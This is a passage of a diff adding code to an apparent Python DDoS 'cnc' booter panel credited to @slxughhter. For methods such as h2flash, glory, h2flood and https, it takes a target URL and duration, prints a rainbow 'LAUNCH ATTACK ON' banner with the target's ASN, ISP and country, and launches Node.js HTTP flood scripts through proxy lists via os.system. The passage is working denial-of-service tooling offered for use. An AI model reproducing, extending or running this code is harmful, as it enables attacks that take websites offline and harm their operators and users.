+\033[38;5;{rainbow[4]}m ⣀⣀⣉⣩⣿⣿⣿⠋⠀⠀⡇⠈⢓⠏⠏⡀⢸⠇⢈⣷\033[38;5;{rainbow[5]}mCOUNTRY:\033[38;5;{rainbow[6]}m {country}
+\033[38;5;{rainbow[0]}m ⢀⠉⠛⣛⣛⡛⠁⠀⠀⣾⠃⠀⣸⠇⣠⡇⢠⡀⠈⢿⡻\033[48;5;15m\033[38;5;{rainbow[2]}m CREDITS \033[0m
+\033[38;5;{rainbow[1]}m ⠈⠙⠛⣿⣶⡾⠛⣡⣾⡟⢠⣾⣿⣿⣟⡤⠀⣷⡀⢨⣿\033[38;5;{rainbow[3]}mOWNER:\033[38;5;{rainbow[5]}m @slxughhter
+\033[38;5;{rainbow[6]}m ⢠⡾⠚⣿⡟⢀⣴⠏⣸⣿⣿⣿⣿⣧⢰⣿⣿⡿⢻⠉⠀\033[38;5;{rainbow[0]}mTELE:\033[38;5;{rainbow[2]}m t.me/slxughhter
+
+\033[38;5;{rainbow[4]}mPlease After Attack Type \033[38;5;{rainbow[1]}m'CLS'\033[38;5;{rainbow[4]}m For Back To Home
+""")
+                    os.system(f'cd meth && screen -dm node pez.js GET {url} {duration} 2 32 proxy.txt --query 1 --bfm true --httpver "http/1.1" --referer %RAND% --ua "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36" --ratelimit true')
+            except ValueError:
+                print("(cnc) wrong format")
+                main()
+            except IndexError:
+                print("(cnc) method url port time")
+                main()
+
+        elif sinput == "h2flash" or sinput == "H2FLASH":
+            try:
+                url = sin.split()[1]
+                port = sin.split()[2]
+                duration = int(sin.split()[3])
+                rainbow = [196, 202, 220, 82, 39, 93, 201]  # Red→Orange→Yellow→Green→Cyan→Purple→Pink                
+                
+                if duration > 86000:
+                    print("(cnc) duration exceeds the maximum limit (86000s)")
+                    continue
+
+                if len(ongoing_attacks) >= MAX_CONCURRENT_ATTACKS:
+                    print(f"(cnc) Maximum concurrent attacks reached ({MAX_CONCURRENT_ATTACKS}). Please wait for one to finish")
+                    continue
+
+
+                ip = get_ip_from_url(url)
+
+                if ip:
+                    asn, isp, org, country = get_ip_info(ip)
+
+                    ongoing_attacks.append({
+                        'host': ip,
+                        'start_time': t.time(),
+                        'duration': duration,
+                        'method': 'h2flash',
+                        'status': 'Ongoing'
+                    })
+                    os.system('clear')
+
+                    print(f"""
+\033[38;5;{rainbow[0]}mLAUNCH ATTACK ON:\033[38;5;{rainbow[1]}m ({waktu()})\033[0m
+\033[38;5;{rainbow[2]}m ⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+\033[38;5;{rainbow[3]}m ⠀⠀⢰⣿⢤⡿⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀ \033[48;5;15m\033[38;5;{rainbow[4]}m ATTACK - DETAILS \033[0m
+\033[38;5;{rainbow[5]}m ⠀⠀⡿⠀⠀⠀⢬⡱⢄⡀⠀⠀⠀⠀⠀⠀    \033[38;5;{rainbow[6]}mSTATUS:\033[38;5;{rainbow[3]}m ATTACK SENT SUCCESSFULLY
+\033[38;5;{rainbow[0]}m ⠀⠀⣷⠀⠀⠀⠀⠙⣦⠙⠦⠤⠴⣤⡀⠀⠀   \033[38;5;{rainbow[1]}mHOST:\033[38;5;{rainbow[4]}m {url}
+\033[38;5;{rainbow[2]}m ⠀⠀⢸⣧⠀⠀⠀⠀⠘⣿⠓⠶⣄⡈⣻⣦⡀⠀  \033[38;5;{rainbow[5]}mPORT:\033[38;5;{rainbow[0]}m {port}
+\033[38;5;{rainbow[6]}m ⠀⢠⡤⣿⣷⠀⠀⠀⠀⣻⣄⡀⠀⠁⣬⡟⣿⣦  \033[38;5;{rainbow[2]}mTIME:\033[38;5;{rainbow[3]}m {duration}
+\033[38;5;{rainbow[1]}m ⠀⠈⢧⣈⠉⡀⠀⠀⠀⡈⠻⣿⣿⣇⠈⡇⣿⣿  \033[38;5;{rainbow[4]}mMETHOD:\033[38;5;{rainbow[5]}m {sinput}
+\033[38;5;{rainbow[0]}m ⠀⠀⠀⠈⠙⢿⡆⠀⠀⣼⠀⢹⡙⢿⣆⠀⢻⣿\033[48;5;15m\033[38;5;{rainbow[3]}m TARGET - DETAILS \033[0m
+\033[38;5;{rainbow[2]}m ⠀⠀⠀⠀⠀⢸⡾⡄⣰⣿⡆⠀⠙⣦⠹⡆⠰⣿  \033[38;5;{rainbow[1]}mASN:\033[38;5;{rainbow[4]}m {asn}
+\033[38;5;{rainbow[5]}m ⠀⠀⠀⠀⢐⣿⠇⣟⠋⢸⣿⣼⠀⣿⣷⣼⡹⣾  \033[38;5;{rainbow[6]}mISP:\033[38;5;{rainbow[0]}m {isp}
+\033[38;5;{rainbow[1]}m ⠀⠀⠀⣚⣻⣿⣶⣿⠀⠈⡛⢿⡀⢸⣿⢛⣿⣿  \033[38;5;{rainbow[2]}mORG:\033[38;5;{rainbow[3]}m {org}
+\033[38;5;{rainbow[4]}m ⣀⣀⣉⣩⣿⣿⣿⠋⠀⠀⡇⠈⢓⠏⠏⡀⢸⠇⢈⣷\033[38;5;{rainbow[5]}mCOUNTRY:\033[38;5;{rainbow[6]}m {country}
+\033[38;5;{rainbow[0]}m ⢀⠉⠛⣛⣛⡛⠁⠀⠀⣾⠃⠀⣸⠇⣠⡇⢠⡀⠈⢿⡻\033[48;5;15m\033[38;5;{rainbow[2]}m CREDITS \033[0m
+\033[38;5;{rainbow[1]}m ⠈⠙⠛⣿⣶⡾⠛⣡⣾⡟⢠⣾⣿⣿⣟⡤⠀⣷⡀⢨⣿\033[38;5;{rainbow[3]}mOWNER:\033[38;5;{rainbow[5]}m @slxughhter
+\033[38;5;{rainbow[6]}m ⢠⡾⠚⣿⡟⢀⣴⠏⣸⣿⣿⣿⣿⣧⢰⣿⣿⡿⢻⠉⠀\033[38;5;{rainbow[0]}mTELE:\033[38;5;{rainbow[2]}m t.me/slxughhter
+
+\033[38;5;{rainbow[4]}mPlease After Attack Type \033[38;5;{rainbow[1]}m'CLS'\033[38;5;{rainbow[4]}m For Back To Home
+""")
+                    os.system(f'cd meth && screen -dm node zero-bypass2.js {url} {duration} 32 2 proxy.txt')
+            except ValueError:
+                print("(cnc) wrong format")
+                main()
+            except IndexError:
+                print("(cnc) method url port time")
+                main()
+
+        elif sinput == "glory" or sinput == "GLORY":
+            try:
+                url = sin.split()[1]
+                port = sin.split()[2]
+                duration = int(sin.split()[3])
+                rainbow = [196, 202, 220, 82, 39, 93, 201]  # Red→Orange→Yellow→Green→Cyan→Purple→Pink                
+                
+                if duration > 86000:
+                    print("(cnc) duration exceeds the maximum limit (86000s)")
+                    continue
+
+                if len(ongoing_attacks) >= MAX_CONCURRENT_ATTACKS:
+                    print(f"(cnc) Maximum concurrent attacks reached ({MAX_CONCURRENT_ATTACKS}). Please wait for one to finish")
+                    continue
+
+
+                ip = get_ip_from_url(url)
+
+                if ip:
+                    asn, isp, org, country = get_ip_info(ip)
+
+                    ongoing_attacks.append({
+                        'host': ip,
+                        'start_time': t.time(),
+                        'duration': duration,
+                        'method': 'glory',
+                        'status': 'Ongoing'
+                    })
+                    os.system('clear')
+
+                    print(f"""
+\033[38;5;{rainbow[0]}mLAUNCH ATTACK ON:\033[38;5;{rainbow[1]}m ({waktu()})\033[0m
+\033[38;5;{rainbow[2]}m ⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+\033[38;5;{rainbow[3]}m ⠀⠀⢰⣿⢤⡿⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀ \033[48;5;15m\033[38;5;{rainbow[4]}m ATTACK - DETAILS \033[0m
+\033[38;5;{rainbow[5]}m ⠀⠀⡿⠀⠀⠀⢬⡱⢄⡀⠀⠀⠀⠀⠀⠀    \033[38;5;{rainbow[6]}mSTATUS:\033[38;5;{rainbow[3]}m ATTACK SENT SUCCESSFULLY
+\033[38;5;{rainbow[0]}m ⠀⠀⣷⠀⠀⠀⠀⠙⣦⠙⠦⠤⠴⣤⡀⠀⠀   \033[38;5;{rainbow[1]}mHOST:\033[38;5;{rainbow[4]}m {url}
+\033[38;5;{rainbow[2]}m ⠀⠀⢸⣧⠀⠀⠀⠀⠘⣿⠓⠶⣄⡈⣻⣦⡀⠀  \033[38;5;{rainbow[5]}mPORT:\033[38;5;{rainbow[0]}m {port}
+\033[38;5;{rainbow[6]}m ⠀⢠⡤⣿⣷⠀⠀⠀⠀⣻⣄⡀⠀⠁⣬⡟⣿⣦  \033[38;5;{rainbow[2]}mTIME:\033[38;5;{rainbow[3]}m {duration}
+\033[38;5;{rainbow[1]}m ⠀⠈⢧⣈⠉⡀⠀⠀⠀⡈⠻⣿⣿⣇⠈⡇⣿⣿  \033[38;5;{rainbow[4]}mMETHOD:\033[38;5;{rainbow[5]}m {sinput}
+\033[38;5;{rainbow[0]}m ⠀⠀⠀⠈⠙⢿⡆⠀⠀⣼⠀⢹⡙⢿⣆⠀⢻⣿\033[48;5;15m\033[38;5;{rainbow[3]}m TARGET - DETAILS \033[0m
+\033[38;5;{rainbow[2]}m ⠀⠀⠀⠀⠀⢸⡾⡄⣰⣿⡆⠀⠙⣦⠹⡆⠰⣿  \033[38;5;{rainbow[1]}mASN:\033[38;5;{rainbow[4]}m {asn}
+\033[38;5;{rainbow[5]}m ⠀⠀⠀⠀⢐⣿⠇⣟⠋⢸⣿⣼⠀⣿⣷⣼⡹⣾  \033[38;5;{rainbow[6]}mISP:\033[38;5;{rainbow[0]}m {isp}
+\033[38;5;{rainbow[1]}m ⠀⠀⠀⣚⣻⣿⣶⣿⠀⠈⡛⢿⡀⢸⣿⢛⣿⣿  \033[38;5;{rainbow[2]}mORG:\033[38;5;{rainbow[3]}m {org}
+\033[38;5;{rainbow[4]}m ⣀⣀⣉⣩⣿⣿⣿⠋⠀⠀⡇⠈⢓⠏⠏⡀⢸⠇⢈⣷\033[38;5;{rainbow[5]}mCOUNTRY:\033[38;5;{rainbow[6]}m {country}
+\033[38;5;{rainbow[0]}m ⢀⠉⠛⣛⣛⡛⠁⠀⠀⣾⠃⠀⣸⠇⣠⡇⢠⡀⠈⢿⡻\033[48;5;15m\033[38;5;{rainbow[2]}m CREDITS \033[0m
+\033[38;5;{rainbow[1]}m ⠈⠙⠛⣿⣶⡾⠛⣡⣾⡟⢠⣾⣿⣿⣟⡤⠀⣷⡀⢨⣿\033[38;5;{rainbow[3]}mOWNER:\033[38;5;{rainbow[5]}m @slxughhter
+\033[38;5;{rainbow[6]}m ⢠⡾⠚⣿⡟⢀⣴⠏⣸⣿⣿⣿⣿⣧⢰⣿⣿⡿⢻⠉⠀\033[38;5;{rainbow[0]}mTELE:\033[38;5;{rainbow[2]}m t.me/slxughhter
+
+\033[38;5;{rainbow[4]}mPlease After Attack Type \033[38;5;{rainbow[1]}m'CLS'\033[38;5;{rainbow[4]}m For Back To Home
+""")
+                    os.system(f'cd meth && screen -dm node glory.js {url} {duration} 32 2 proxy.txt')
+            except ValueError:
+                print("(cnc) wrong format")
+                main()
+            except IndexError:
+                print("(cnc) method url port time")
+                main()
+
+        elif sinput == "h2bypass" or sinput == "H2BYPASS":
+            try:
+                url = sin.split()[1]
+                port = sin.split()[2]
+                duration = int(sin.split()[3])
+                rainbow = [196, 202, 220, 82, 39, 93, 201]  # Red→Orange→Yellow→Green→Cyan→Purple→Pink                
+                
+                if duration > 86000:
+                    print("(cnc) duration exceeds the maximum limit (86000s)")
+                    continue
+
+                if len(ongoing_attacks) >= MAX_CONCURRENT_ATTACKS:
+                    print(f"(cnc) Maximum concurrent attacks reached ({MAX_CONCURRENT_ATTACKS}). Please wait for one to finish")
+                    continue
+
+
+                ip = get_ip_from_url(url)
+
+                if ip:
+                    asn, isp, org, country = get_ip_info(ip)
+
+                    ongoing_attacks.append({
+                        'host': ip,
+                        'start_time': t.time(),
+                        'duration': duration,
+                        'method': 'h2bypass',
+                        'status': 'Ongoing'
+                    })
+                    os.system('clear')
+
+                    print(f"""
+\033[38;5;{rainbow[0]}mLAUNCH ATTACK ON:\033[38;5;{rainbow[1]}m ({waktu()})\033[0m
+\033[38;5;{rainbow[2]}m ⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+\033[38;5;{rainbow[3]}m ⠀⠀⢰⣿⢤⡿⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀ \033[48;5;15m\033[38;5;{rainbow[4]}m ATTACK - DETAILS \033[0m
+\033[38;5;{rainbow[5]}m ⠀⠀⡿⠀⠀⠀⢬⡱⢄⡀⠀⠀⠀⠀⠀⠀    \033[38;5;{rainbow[6]}mSTATUS:\033[38;5;{rainbow[3]}m ATTACK SENT SUCCESSFULLY
+\033[38;5;{rainbow[0]}m ⠀⠀⣷⠀⠀⠀⠀⠙⣦⠙⠦⠤⠴⣤⡀⠀⠀   \033[38;5;{rainbow[1]}mHOST:\033[38;5;{rainbow[4]}m {url}
+\033[38;5;{rainbow[2]}m ⠀⠀⢸⣧⠀⠀⠀⠀⠘⣿⠓⠶⣄⡈⣻⣦⡀⠀  \033[38;5;{rainbow[5]}mPORT:\033[38;5;{rainbow[0]}m {port}
+\033[38;5;{rainbow[6]}m ⠀⢠⡤⣿⣷⠀⠀⠀⠀⣻⣄⡀⠀⠁⣬⡟⣿⣦  \033[38;5;{rainbow[2]}mTIME:\033[38;5;{rainbow[3]}m {duration}
+\033[38;5;{rainbow[1]}m ⠀⠈⢧⣈⠉⡀⠀⠀⠀⡈⠻⣿⣿⣇⠈⡇⣿⣿  \033[38;5;{rainbow[4]}mMETHOD:\033[38;5;{rainbow[5]}m {sinput}
+\033[38;5;{rainbow[0]}m ⠀⠀⠀⠈⠙⢿⡆⠀⠀⣼⠀⢹⡙⢿⣆⠀⢻⣿\033[48;5;15m\033[38;5;{rainbow[3]}m TARGET - DETAILS \033[0m
+\033[38;5;{rainbow[2]}m ⠀⠀⠀⠀⠀⢸⡾⡄⣰⣿⡆⠀⠙⣦⠹⡆⠰⣿  \033[38;5;{rainbow[1]}mASN:\033[38;5;{rainbow[4]}m {asn}
+\033[38;5;{rainbow[5]}m ⠀⠀⠀⠀⢐⣿⠇⣟⠋⢸⣿⣼⠀⣿⣷⣼⡹⣾  \033[38;5;{rainbow[6]}mISP:\033[38;5;{rainbow[0]}m {isp}
+\033[38;5;{rainbow[1]}m ⠀⠀⠀⣚⣻⣿⣶⣿⠀⠈⡛⢿⡀⢸⣿⢛⣿⣿  \033[38;5;{rainbow[2]}mORG:\033[38;5;{rainbow[3]}m {org}
+\033[38;5;{rainbow[4]}m ⣀⣀⣉⣩⣿⣿⣿⠋⠀⠀⡇⠈⢓⠏⠏⡀⢸⠇⢈⣷\033[38;5;{rainbow[5]}mCOUNTRY:\033[38;5;{rainbow[6]}m {country}
+\033[38;5;{rainbow[0]}m ⢀⠉⠛⣛⣛⡛⠁⠀⠀⣾⠃⠀⣸⠇⣠⡇⢠⡀⠈⢿⡻\033[48;5;15m\033[38;5;{rainbow[2]}m CREDITS \033[0m
+\033[38;5;{rainbow[1]}m ⠈⠙⠛⣿⣶⡾⠛⣡⣾⡟⢠⣾⣿⣿⣟⡤⠀⣷⡀⢨⣿\033[38;5;{rainbow[3]}mOWNER:\033[38;5;{rainbow[5]}m @slxughhter
+\033[38;5;{rainbow[6]}m ⢠⡾⠚⣿⡟⢀⣴⠏⣸⣿⣿⣿⣿⣧⢰⣿⣿⡿⢻⠉⠀\033[38;5;{rainbow[0]}mTELE:\033[38;5;{rainbow[2]}m t.me/slxughhter
+
+\033[38;5;{rainbow[4]}mPlease After Attack Type \033[38;5;{rainbow[1]}m'CLS'\033[38;5;{rainbow[4]}m For Back To Home
+""")
+                    os.system(f'cd meth && screen -dm node bypass {url} {duration} 32 2 proxy.txt')
+            except ValueError:
+                print("(cnc) wrong format")
+                main()
+            except IndexError:
+                print("(cnc) method url port time")
+                main()
+
+        elif sinput == "h2flood" or sinput == "H2FLOOD":
+            try:
+                url = sin.split()[1]
+                port = sin.split()[2]
+                duration = int(sin.split()[3])
+                rainbow = [196, 202, 220, 82, 39, 93, 201]  # Red→Orange→Yellow→Green→Cyan→Purple→Pink                
+                
+                if duration > 86000:
+                    print("(cnc) duration exceeds the maximum limit (86000s)")
+                    continue
+
+                if len(ongoing_attacks) >= MAX_CONCURRENT_ATTACKS:
+                    print(f"(cnc) Maximum concurrent attacks reached ({MAX_CONCURRENT_ATTACKS}). Please wait for one to finish")
+                    continue
+
+
+                ip = get_ip_from_url(url)
+
+                if ip:
+                    asn, isp, org, country = get_ip_info(ip)
+
+                    ongoing_attacks.append({
+                        'host': ip,
+                        'start_time': t.time(),
+                        'duration': duration,
+                        'method': 'h2flood',
+                        'status': 'Ongoing'
+                    })
+                    os.system('clear')
+
+                    print(f"""
+\033[38;5;{rainbow[0]}mLAUNCH ATTACK ON:\033[38;5;{rainbow[1]}m ({waktu()})\033[0m
+\033[38;5;{rainbow[2]}m ⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+\033[38;5;{rainbow[3]}m ⠀⠀⢰⣿⢤⡿⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀ \033[48;5;15m\033[38;5;{rainbow[4]}m ATTACK - DETAILS \033[0m
+\033[38;5;{rainbow[5]}m ⠀⠀⡿⠀⠀⠀⢬⡱⢄⡀⠀⠀⠀⠀⠀⠀    \033[38;5;{rainbow[6]}mSTATUS:\033[38;5;{rainbow[3]}m ATTACK SENT SUCCESSFULLY
+\033[38;5;{rainbow[0]}m ⠀⠀⣷⠀⠀⠀⠀⠙⣦⠙⠦⠤⠴⣤⡀⠀⠀   \033[38;5;{rainbow[1]}mHOST:\033[38;5;{rainbow[4]}m {url}
+\033[38;5;{rainbow[2]}m ⠀⠀⢸⣧⠀⠀⠀⠀⠘⣿⠓⠶⣄⡈⣻⣦⡀⠀  \033[38;5;{rainbow[5]}mPORT:\033[38;5;{rainbow[0]}m {port}
+\033[38;5;{rainbow[6]}m ⠀⢠⡤⣿⣷⠀⠀⠀⠀⣻⣄⡀⠀⠁⣬⡟⣿⣦  \033[38;5;{rainbow[2]}mTIME:\033[38;5;{rainbow[3]}m {duration}
+\033[38;5;{rainbow[1]}m ⠀⠈⢧⣈⠉⡀⠀⠀⠀⡈⠻⣿⣿⣇⠈⡇⣿⣿  \033[38;5;{rainbow[4]}mMETHOD:\033[38;5;{rainbow[5]}m {sinput}
+\033[38;5;{rainbow[0]}m ⠀⠀⠀⠈⠙⢿⡆⠀⠀⣼⠀⢹⡙⢿⣆⠀⢻⣿\033[48;5;15m\033[38;5;{rainbow[3]}m TARGET - DETAILS \033[0m
+\033[38;5;{rainbow[2]}m ⠀⠀⠀⠀⠀⢸⡾⡄⣰⣿⡆⠀⠙⣦⠹⡆⠰⣿  \033[38;5;{rainbow[1]}mASN:\033[38;5;{rainbow[4]}m {asn}
+\033[38;5;{rainbow[5]}m ⠀⠀⠀⠀⢐⣿⠇⣟⠋⢸⣿⣼⠀⣿⣷⣼⡹⣾  \033[38;5;{rainbow[6]}mISP:\033[38;5;{rainbow[0]}m {isp}
+\033[38;5;{rainbow[1]}m ⠀⠀⠀⣚⣻⣿⣶⣿⠀⠈⡛⢿⡀⢸⣿⢛⣿⣿  \033[38;5;{rainbow[2]}mORG:\033[38;5;{rainbow[3]}m {org}
+\033[38;5;{rainbow[4]}m ⣀⣀⣉⣩⣿⣿⣿⠋⠀⠀⡇⠈⢓⠏⠏⡀⢸⠇⢈⣷\033[38;5;{rainbow[5]}mCOUNTRY:\033[38;5;{rainbow[6]}m {country}
+\033[38;5;{rainbow[0]}m ⢀⠉⠛⣛⣛⡛⠁⠀⠀⣾⠃⠀⣸⠇⣠⡇⢠⡀⠈⢿⡻\033[48;5;15m\033[38;5;{rainbow[2]}m CREDITS \033[0m
+\033[38;5;{rainbow[1]}m ⠈⠙⠛⣿⣶⡾⠛⣡⣾⡟⢠⣾⣿⣿⣟⡤⠀⣷⡀⢨⣿\033[38;5;{rainbow[3]}mOWNER:\033[38;5;{rainbow[5]}m @slxughhter
+\033[38;5;{rainbow[6]}m ⢠⡾⠚⣿⡟⢀⣴⠏⣸⣿⣿⣿⣿⣧⢰⣿⣿⡿⢻⠉⠀\033[38;5;{rainbow[0]}mTELE:\033[38;5;{rainbow[2]}m t.me/slxughhter
+
+\033[38;5;{rainbow[4]}mPlease After Attack Type \033[38;5;{rainbow[1]}m'CLS'\033[38;5;{rainbow[4]}m For Back To Home
+""")
+                    os.system(f'cd meth && screen -dm node flood.js {url} {duration} 32 2 proxy.txt')
+            except ValueError:
+                print("(cnc) wrong format")
+                main()
+            except IndexError:
+                print("(cnc) method url port time")
+                main()
+
+        elif sinput == "https" or sinput == "HTTPS":
+            try:
+                url = sin.split()[1]
+                port = sin.split()[2]
+                duration = int(sin.split()[3])
+                rainbow = [196, 202, 220, 82, 39, 93, 201]  # Red→Orange→Yellow→Green→Cyan→Purple→Pink                
+                
+                if duration > 86000:
+                    print("(cnc) duration exceeds the maximum limit (86000s)")
+                    continue
+
+                if len(ongoing_attacks) >= MAX_CONCURRENT_ATTACKS:
+                    print(f"(cnc) Maximum concurrent attacks reached ({MAX_CONCURRENT_ATTACKS}). Please wait for one to finish")
+                    continue
+
+
+                ip = get_ip_from_url(url)
+
+                if ip:
+                    asn, isp, org, country = get_ip_info(ip)
+
+                    ongoing_attacks.append({
+                        'host': ip,
+                        'start_time': t.time(),
+                        'duration': duration,
+                        'method': 'https',
+                        'status': 'Ongoing'
+                    })
+                    os.system('clear')
+
+                    print(f"""
+\033[38;5;{rainbow[0]}mLAUNCH ATTACK ON:\033[38;5;{rainbow[1]}m ({waktu()})\033[0m
+\033[38;5;{rainbow[2]}m ⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+\033[38;5;{rainbow[3]}m ⠀⠀⢰⣿⢤⡿⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀ \033[48;5;15m\033[38;5;{rainbow[4]}m ATTACK - DETAILS \033[0m
+\033[38;5;{rainbow[5]}m ⠀⠀⡿⠀⠀⠀⢬⡱⢄⡀⠀⠀⠀⠀⠀⠀    \033[38;5;{rainbow[6]}mSTATUS:\033[38;5;{rainbow[3]}m ATTACK SENT SUCCESSFULLY
+\033[38;5;{rainbow[0]}m ⠀⠀⣷⠀⠀⠀⠀⠙⣦⠙⠦⠤⠴⣤⡀⠀⠀   \033[38;5;{rainbow[1]}mHOST:\033[38;5;{rainbow[4]}m {url}
+\033[38;5;{rainbow[2]}m ⠀⠀⢸⣧⠀⠀⠀⠀⠘⣿⠓⠶⣄⡈⣻⣦⡀⠀  \033[38;5;{rainbow[5]}mPORT:\033[38;5;{rainbow[0]}m {port}
+\033[38;5;{rainbow[6]}m ⠀⢠⡤⣿⣷⠀⠀⠀⠀⣻⣄⡀⠀⠁⣬⡟⣿⣦  \033[38;5;{rainbow[2]}mTIME:\033[38;5;{rainbow[3]}m {duration}
+\033[38;5;{rainbow[1]}m ⠀⠈⢧⣈⠉⡀⠀⠀⠀⡈⠻⣿⣿⣇⠈⡇⣿⣿  \033[38;5;{rainbow[4]}mMETHOD:\033[38;5;{rainbow[5]}m {sinput}
+\033[38;5;{rainbow[0]}m ⠀⠀⠀⠈⠙⢿⡆⠀⠀⣼⠀⢹⡙⢿⣆⠀⢻⣿\033[48;5;15m\033[38;5;{rainbow[3]}m TARGET - DETAILS \033[0m
+\033[38;5;{rainbow[2]}m ⠀⠀⠀⠀⠀⢸⡾⡄⣰⣿⡆⠀⠙⣦⠹⡆⠰⣿  \033[38;5;{rainbow[1]}mASN:\033[38;5;{rainbow[4]}m {asn}
+\033[38;5;{rainbow[5]}m ⠀⠀⠀⠀⢐⣿⠇⣟⠋⢸⣿⣼⠀⣿⣷⣼⡹⣾  \033[38;5;{rainbow[6]}mISP:\033[38;5;{rainbow[0]}m {isp}
+\033[38;5;{rainbow[1]}m ⠀⠀⠀⣚⣻⣿⣶⣿⠀⠈⡛⢿⡀⢸⣿⢛⣿⣿  \033[38;5;{rainbow[2]}mORG:\033[38;5;{rainbow[3]}m {org}
+\033[38;5;{rainbow[4]}m ⣀⣀⣉⣩⣿⣿⣿⠋⠀⠀⡇⠈⢓⠏⠏⡀⢸⠇⢈⣷\033[38;5;{rainbow[5]}mCOUNTRY:\033[38;5;{rainbow[6]}m {country}
+\033[38;5;{rainbow[0]}m ⢀⠉⠛⣛⣛⡛⠁⠀⠀⣾⠃⠀⣸⠇⣠⡇⢠⡀⠈⢿⡻\033[48;5;15m\033[38;5;{rainbow[2]}m CREDITS \033[0m
+\033[38;5;{rainbow[1]}m ⠈⠙⠛⣿⣶⡾⠛⣡⣾⡟⢠⣾⣿⣿⣟⡤⠀⣷⡀⢨⣿\033[38;5;{rainbow[3]}mOWNER:\033[38;5;{rainbow[5]}m @slxughhter
+\033[38;5;{rainbow[6]}m ⢠⡾⠚⣿⡟⢀⣴⠏⣸⣿⣿⣿⣿⣧⢰⣿⣿⡿⢻⠉⠀\033[38;5;{rainbow[0]}mTELE:\033[38;5;{rainbow[2]}m t.me/slxughhter
+
+\033[38;5;{rainbow[4]}mPlease After Attack Type \033[38;5;{rainbow[1]}m'CLS'\033[38;5;{rainbow[4]}m For Back To Home
+""")
+                    os.system(f'cd meth && screen -dm node HTTPS.js {url} {duration} 32 2 proxy.txt')
+            except ValueError:
+                print("(cnc) wrong format")
+                main()
+            except IndexError:
+                print("(cnc) method url port time")
+                main()
+
+        elif sinput == "http-x" or sinput == "HTTP-X":
+            try:
+                url = sin.split()[1]
+                port = sin.split()[2]
+                duration = int(sin.split()[3])
+                rainbow = [196, 202, 220, 82, 39, 93, 201]  # Red→Orange→Yellow→Green→Cyan→Purple→Pink                
+                
+                if duration > 86000:
+                    print("(cnc) duration exceeds the maximum limit (86000s)")
+                    continue
+
+                if len(ongoing_attacks) >= MAX_CONCURRENT_ATTACKS:
+                    print(f"(cnc) Maximum concurrent attacks reached ({MAX_CONCURRENT_ATTACKS}). Please wait for one to finish")
+                    continue
+
+
+                ip = get_ip_from_url(url)
+
+                if ip:
+                    asn, isp, org, country = get_ip_info(ip)
+
+                    ongoing_attacks.append({
+                        'host': ip,
+                        'start_time': t.time(),
+                        'duration': duration,
+                        'method': 'http-x',
+                        'status': 'Ongoing'
+                    })
+                    os.system('clear')
+
+                    print(f"""
+\033[38;5;{rainbow[0]}mLAUNCH ATTACK ON:\033[38;5;{rainbow[1]}m ({waktu()})\033[0m
+\033[38;5;{rainbow[2]}m ⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+\033[38;5;{rainbow[3]}m ⠀⠀⢰⣿⢤⡿⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀ \033[48;5;15m\033[38;5;{rainbow[4]}m ATTACK - DETAILS \033[0m
+\033[38;5;{rainbow[5]}m ⠀⠀⡿⠀⠀⠀⢬⡱⢄⡀⠀⠀⠀⠀⠀⠀    \033[38;5;{rainbow[6]}mSTATUS:\033[38;5;{rainbow[3]}m ATTACK SENT SUCCESSFULLY
+\033[38;5;{rainbow[0]}m ⠀⠀⣷⠀⠀⠀⠀⠙⣦⠙⠦⠤⠴⣤⡀⠀⠀   \033[38;5;{rainbow[1]}mHOST:\033[38;5;{rainbow[4]}m {url}
+\033[38;5;{rainbow[2]}m ⠀⠀⢸⣧⠀⠀⠀⠀⠘⣿⠓⠶⣄⡈⣻⣦⡀⠀  \033[38;5;{rainbow[5]}mPORT:\033[38;5;{rainbow[0]}m {port}
+\033[38;5;{rainbow[6]}m ⠀⢠⡤⣿⣷⠀⠀⠀⠀⣻⣄⡀⠀⠁⣬⡟⣿⣦  \033[38;5;{rainbow[2]}mTIME:\033[38;5;{rainbow[3]}m {duration}
+\033[38;5;{rainbow[1]}m ⠀⠈⢧⣈⠉⡀⠀⠀⠀⡈⠻⣿⣿⣇⠈⡇⣿⣿  \033[38;5;{rainbow[4]}mMETHOD:\033[38;5;{rainbow[5]}m {sinput}
+\033[38;5;{rainbow[0]}m ⠀⠀⠀⠈⠙⢿⡆⠀⠀⣼⠀⢹⡙⢿⣆⠀⢻⣿\033[48;5;15m\033[38;5;{rainbow[3]}m TARGET - DETAILS \033[0m
+\033[38;5;{rainbow[2]}m ⠀⠀⠀⠀⠀⢸⡾⡄⣰⣿⡆⠀⠙⣦⠹⡆⠰⣿  \033[38;5;{rainbow[1]}mASN:\033[38;5;{rainbow[4]}m {asn}
+\033[38;5;{rainbow[5]}m ⠀⠀⠀⠀⢐⣿⠇⣟⠋⢸⣿⣼⠀⣿⣷⣼⡹⣾  \033[38;5;{rainbow[6]}mISP:\033[38;5;{rainbow[0]}m {isp}
+\033[38;5;{rainbow[1]}m ⠀⠀⠀⣚⣻⣿⣶⣿⠀⠈⡛⢿⡀⢸⣿⢛⣿⣿  \033[38;5;{rainbow[2]}mORG:\033[38;5;{rainbow[3]}m {org}
+\033[38;5;{rainbow[4]}m ⣀⣀⣉⣩⣿⣿⣿⠋⠀⠀⡇⠈⢓⠏⠏⡀⢸⠇⢈⣷\033[38;5;{rainbow[5]}mCOUNTRY:\033[38;5;{rainbow[6]}m {country}
+\033[38;5;{rainbow[0]}m ⢀⠉⠛⣛⣛⡛⠁⠀⠀⣾⠃⠀⣸⠇⣠⡇⢠⡀⠈⢿⡻\033[48;5;15m\033[38;5;{rainbow[2]}m CREDITS \033[0m
